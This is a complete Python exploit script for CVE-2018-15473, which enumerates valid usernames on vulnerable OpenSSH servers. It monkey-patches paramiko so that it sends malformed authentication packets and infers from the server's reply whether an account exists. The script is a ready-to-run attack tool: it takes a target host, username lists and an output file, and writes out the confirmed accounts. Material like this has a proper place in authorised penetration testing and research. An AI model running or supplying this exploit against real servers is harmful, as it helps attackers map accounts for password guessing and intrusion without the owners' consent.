#!/usr/bin/env python3
# CVE-2018-15473 SSH User Enumeration by Leap Security (@LeapSecurity) https://leapsecurity.io
# Credits: Matthew Daley, Justin Gardner, Lee David Painter
# Updated for Python 3 and paramiko 4.x

import argparse
import logging
import socket
import sys

try:
    import paramiko
    from paramiko import auth_handler, common, message, transport
    from paramiko.ssh_exception import SSHException, AuthenticationException
except ImportError:
    print("[!] paramiko is required: pip3 install paramiko")
    sys.exit(1)


class InvalidUsername(Exception):
    pass


# Store original methods before patching
_original_parse_service_accept = auth_handler.AuthHandler._parse_service_accept
_original_add_boolean = message.Message.add_boolean


def _patched_add_boolean(self, b):
    """Malformed add_boolean that does nothing - corrupts the packet."""
    pass


def _patched_parse_service_accept(self, m):
    """
    Patched service accept handler that corrupts the auth packet.
    After receiving SERVICE_ACCEPT, we patch add_boolean to malform
    the subsequent USERAUTH_REQUEST packet.
    """
    # Patch add_boolean to corrupt the packet
    message.Message.add_boolean = _patched_add_boolean
    # Call original handler
    return _original_parse_service_accept(self, m)


def _patched_parse_userauth_failure(self, m):
    """
    Patched userauth failure handler.
    If we get here, the username was invalid (server properly rejected malformed packet).
    """
    raise InvalidUsername()


# Apply monkey patches to AuthHandler class
auth_handler.AuthHandler._parse_service_accept = _patched_parse_service_accept
auth_handler.AuthHandler._parse_userauth_failure = _patched_parse_userauth_failure


def check_user(target, port, username, timeout=5, verbose=False):
    """
    Check if a username is valid on the target SSH server.

    Returns:
        True if valid, False if invalid, None if error occurred
    """
    # Reset add_boolean before each check (in case previous run patched it)
    message.Message.add_boolean = _original_add_boolean

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    trans = None

    try:
        sock.connect((target, port))
        trans = transport.Transport(sock)
        trans.start_client(timeout=timeout)
        trans.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except socket.timeout:
        if verbose:
            print(f"[!] Connection to {target}:{port} timed out")
        return None
    except OSError as e:
        if verbose:
            print(f"[!] Connection error: {e}")
        return None
    except SSHException as e:
        if verbose:
            print(f"[!] SSH error: {e}")
        return None
    except InvalidUsername:
        return False
    except AuthenticationException:
        # Auth failed normally = username exists
        return True
    except Exception as e:
        if verbose:
            print(f"[!] Error for {username}: {e}")
        return None
    finally:
        if trans:
            trans.close()
        sock.close()

    return None


def enumerate_users(target, port, usernames, timeout=5, verbose=False):
    """Enumerate multiple usernames and return results."""
    valid = []
    invalid = []
    errors = []

    for username in usernames:
        username = username.strip()
        if not username or username.startswith('#'):
            continue

        result = check_user(target, port, username, timeout, verbose)

        if result is True:
            print(f"[+] {username} is a valid username")
            valid.append(username)
        elif result is False:
            if verbose:
                print(f"[-] {username} is an invalid username")
            invalid.append(username)
        else:
            if verbose:
                print(f"[?] {username} - error occurred")
            errors.append(username)

    return valid, invalid, errors


def main():
    # Suppress paramiko logging
    logging.getLogger('paramiko').setLevel(logging.CRITICAL)

    parser = argparse.ArgumentParser(
        description='CVE-2018-15473 SSH User Enumeration by Leap Security (@LeapSecurity)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s 192.168.1.1 -u root
  %(prog)s 192.168.1.1 -U userlist.txt
  %(prog)s 192.168.1.1 -p 2222 -U userlist.txt -v
        '''
    )
    parser.add_argument('target', help="IP address or hostname of the target system")
    parser.add_argument('-p', '--port', type=int, default=22,
                        help="SSH port (default: 22)")
    parser.add_argument('-u', '--username',
                        help="Single username to check")
    parser.add_argument('-U', '--userlist',
                        help="File containing usernames (one per line)")
    parser.add_argument('-t', '--timeout', type=float, default=5.0,
                        help="Connection timeout in seconds (default: 5)")
    parser.add_argument('-v', '--verbose', action='store_true',
                        help="Verbose output (show invalid usernames and errors)")
    parser.add_argument('-o', '--output',
                        help="Write valid usernames to file")

    args = parser.parse_args()

    if not args.username and not args.userlist:
        parser.error("Either -u/--username or -U/--userlist is required")

    # Build username list
    usernames = []
    if args.username:
        usernames.append(args.username)
    if args.userlist:
        try:
            with open(args.userlist, 'r', encoding='utf-8', errors='ignore') as f:
                usernames.extend(f.readlines())
        except FileNotFoundError:
            print(f"[!] Userlist file not found: {args.userlist}")
            sys.exit(1)
        except PermissionError:
            print(f"[!] Permission denied: {args.userlist}")
            sys.exit(1)

    usernames = [u.strip() for u in usernames if u.strip() and not u.strip().startswith('#')]

    if not usernames:
        print("[!] No usernames to check")
        sys.exit(1)

    print(f"[*] Target: {args.target}:{args.port}")
    print(f"[*] Usernames: {len(usernames)}")
    print()

    valid, invalid, errors = enumerate_users(
        args.target, args.port, usernames, args.timeout, args.verbose
    )

    print()
    print(f"[*] Valid: {len(valid)}")
    if args.verbose:
        print(f"[*] Invalid: {len(invalid)}")
        print(f"[*] Errors: {len(errors)}")

    if args.output and valid:
        try:
            with open(args.output, 'w') as f:
                f.write('\n'.join(valid) + '\n')
            print(f"[*] Written to: {args.output}")
        except Exception as e:
            print(f"[!] Write failed: {e}")

    sys.exit(0 if valid else 1)


if __name__ == '__main__':
    main()
